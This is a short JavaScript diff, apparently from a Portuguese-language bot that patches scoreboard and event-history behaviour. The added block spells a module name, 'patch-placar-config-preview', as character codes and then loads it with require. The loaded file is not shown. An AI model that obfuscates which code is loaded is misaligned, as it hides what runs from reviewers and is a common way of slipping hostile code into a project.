@@ -28,4 +28,11 @@ try {
   console.error('Erro ao carregar patch de acesso aos eventos:', error.message);
 }
 
+try {
+  const p = String.fromCharCode(112,97,116,99,104,45,112,108,97,99,97,114,45,99,111,110,102,105,103,45,112,114,101,118,105,101,119);
+  require('./' + p);
+} catch (error) {
+  console.error('Erro ao carregar patch extra do placar:', error.message);
+}
+
 console.log('Patch aplicado: histórico de resultados usa o canal 1518441859519877120.');
